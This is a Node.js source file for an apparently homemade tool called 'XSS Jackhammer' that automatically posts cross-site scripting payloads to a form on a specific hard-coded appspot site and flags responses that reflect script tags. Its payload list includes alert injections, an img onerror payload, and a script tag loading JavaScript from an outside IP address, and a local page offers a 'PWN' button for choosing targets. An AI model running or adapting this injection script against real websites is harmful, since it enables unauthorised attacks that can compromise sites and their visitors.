http = require('http')
jsdom = require('jsdom')
var art = require('ascii-art');

var request = require('request');
express = require('express')
app = express()

app.use(express.bodyParser())


//text
art.font('XSS Jackhammer', 'Doom', function(rendered){
    console.log(art.style(rendered, 'white_bg+bright_blue'));
});//text

//XSS Strings
list_search = ["script", "&lt;script", "<script"]
list_post = ["<script>alert('1')</script>", "<script src=//54.243.84.85/new_nyan.js></script>", "<img src=x onerror=alert(0)> "]

app.post("/submit", function(req, res) {


	req.body['url']

	res.end(req.body['url'])
}
)
	var getUpdatedFunction = function(i1, list_post1, list_search1) {
			return function (error,response,body) {
			bVar = body;

			for (j=0;j<list_search1.length;j++)
			{
				idx=bVar.indexOf(list_search1[j])
				if (idx != -1) {
				console.log("Flagged :" + list_search1[j]) }
			}
			
			}
		}


		//loop searches 
	bVar = ""
	uVar = "https://utsolver.appspot.com/"
	var arrayLength = list_post.length;
	form = ""
	jsdom.env(
	  'https://utsolver.appspot.com/', //change back to 'url'
	  ["http://code.jquery.com/jquery.js"],
	  function (errors, window) {
		console.log(window.$("form")[0].action);
		console.log("Load URL: https://utsolver.appspot.com/")
		//var formname = window.$("form")[0].action);
		

		//autom8
			console.log("Exploits Loaded: " + arrayLength);
			for (i=0;i<arrayLength;i++){
				

			request.post("https://utsolver.appspot.com/letuscommence",{form: {question:list_post[i]}},getUpdatedFunction(i,list_post,list_search))}}

	  
	);


app.get("/", function(req, res) {
	res.end('<html><form action="/submit" method="POST">Target Site: <input name="url" /><button>PWN</button></form></html>');
});

var server = app.listen(3000, function() {
    console.log('Listening on port %d', server.address().port);
});